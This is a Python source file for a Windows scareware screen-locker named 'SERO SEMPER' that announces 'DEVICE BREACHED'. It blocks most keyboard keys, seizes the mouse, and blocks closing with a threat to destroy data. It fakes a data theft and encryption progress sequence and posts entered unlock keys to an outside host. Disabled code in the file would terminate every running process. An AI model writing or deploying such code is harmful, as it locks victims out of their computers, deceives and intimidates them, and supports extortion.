import customtkinter
import threading
import time
import sys
import random
import os
import requests
from PIL import ImageTk, Image
import tkinter as tk
import psutil
import subprocess
import wmi
import os
from win10toast import ToastNotifier
import keyboard
import pyautogui

pyautogui.FAILSAFE = False

toast = ToastNotifier()

def center_window(window, width, height):
    # Get the screen width and height
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()

    # Calculate the x and y coordinates for the centered window
    x = (screen_width - width) // 2
    y = (screen_height - height) // 2

    # Set the window's geometry to be centered on the screen
    window.geometry(f"{width}x{height}+{x}+{y}")

class App(customtkinter.CTk):
    def __init__(self):
        super().__init__()
        self.running = True
        center_window(self, 475, 425)
        self.iconbitmap("logo.ico")
        self.title("SERO SEMPER")
        

        pil_image = Image.open("logomain_notransparent.png")
        new_size = (160, 160)
        resized_image = pil_image.resize(new_size, Image.Resampling.BILINEAR)
        self.img = ImageTk.PhotoImage(resized_image)
        self.panel = tk.Label(self, image = self.img, width=150, height=150)
        self.message = customtkinter.CTkLabel(self, text="DEVICE BREACHED", font=customtkinter.CTkFont(size=20, weight="bold"))
        self.status = customtkinter.CTkLabel(self, text="STATUS...", font=customtkinter.CTkFont(size=15, weight="bold"))
        self.button = customtkinter.CTkButton(self, text="UNLOCK", command=self.button_callbck)
        self.input_box = customtkinter.CTkEntry(self, width=100)
        
        self.loading_bar = customtkinter.CTkProgressBar(self, width=300)
        self.loading_bar.pack(side="bottom", pady=10)
        
        self.loading_bar.configure(mode="indeterminnate")
        self.loading_bar.start()
        
        
        self.panel.pack(side="top")
        self.message.pack(side="top", pady=10)
        self.button.pack(padx=20, pady=5)
        self.input_box.pack(padx=20, pady=5)
        self.status.pack(side="bottom", pady=5)

        self.resizable(False, False)
        self.protocol("WM_DELETE_WINDOW", self.re_launch)
        #self.terminate_all()
        #self.focus_force_element()
        self.lift()
        self.force_mouse_control()
        self.main_virus()
        self.mainloop()
        

    def button_callbck(self):
        def unlock_thread(self):
            try:
                key = self.input_box.get()
                print(f"CLIENT ATTEMPTING UNLOCK WITH KEY: {key}")
                requests.post("http://robottik.co.uk/unlock", data={"key": key})
            except Exception as e:
                print(f"FAILED TO UNLOCK: {e}")
        threading.Thread(target=unlock_thread, args=(self,)).start()

    def re_launch(self):
        print("CLIENT ATTEMPTING CLOSE")
        #self.status.configure(text=)
        toast.show_toast(
            "DANGER",
            "Attempting to interfere with this process will result in destruction of data on this device.",
            duration = 2,
            icon_path = "logo.ico",
            threaded = True,
        )


    def main_virus(self):

        def keyboard_kill(self):
            for i in range(150):
                keyboard.block_key(i)
            #time.sleep(3)

        keyboard_kill(self)

        def data_thread(self):
            print("BEGINNING DATA HEIST")
            try:
                self.status.configure(text="STATUS: BEGINNING DATA HEIST...")
                time.sleep(2)
                self.status.configure(text="STATUS: ITERATING ROOT DIRECTORY...")
                time.sleep(random.randint(3,5))
                self.status.configure(text="STATUS: CLONING REGISTRY EDITOR DATA...")
                time.sleep(random.randint(3,5))
                self.status.configure(text="HINT: PULLING THE PLUG MIGHT BE A GOOD IDEA...")
                time.sleep(random.randint(3,5))
                self.status.configure(text="HINT: KEYBOARD NOT WORKING??")
                time.sleep(random.randint(3,5))
                self.status.configure(text="HINT: DISCONNECTING INTERNET IS NOT A GOOD IDEA...")
                time.sleep(random.randint(3,5))
                self.status.configure(text="COMPLETE")
                self.loading_bar.stop()
                time.sleep(random.randint(3,5))
                self.status.configure(text="DATA ENCRYPTED AND EXPORTED")
                time.sleep(random.randint(3,5))
                self.status.configure(text="DEVICE PERMANENTLY LOCKED - ENJOY")
            except Exception as error:
                print(error)
            while self.running:
                time.sleep(30)
                
                




        threading.Thread(target=data_thread, args=(self,)).start()

    def force_mouse_control(self):
        def threading_mouse(self):
            while self.running:
                #time.sleep(0.01)
                pyautogui.moveTo(random.randint(0, 1920), random.randint(0, 1080))
        threading.Thread(target=threading_mouse, args=(self,)).start()

    def focus_force_element(self):
        def threading_focus(self):
            while self.running:
                time.sleep(0.01)
                self.focus_force()
                self.lift()
                self.attributes("-topmost", True)
        threading.Thread(target=threading_focus, args=(self,)).start()

    def terminate_all(self):
        # Kill all open/active processes
        f = wmi.WMI()
        current_pid = os.getpid()
        print(current_pid)
        for process in f.Win32_Process():
            try:
                if process.ProcessId != current_pid:
                    print(process.ProcessId)
                    process.Terminate()
            except Exception as e:
                print(f"FAILED TO KILL PROCESS: {e}")
        # Open a single exe using subprocess
        #subprocess.Popen("C:\\path\\to\\exe.exe")

app = App()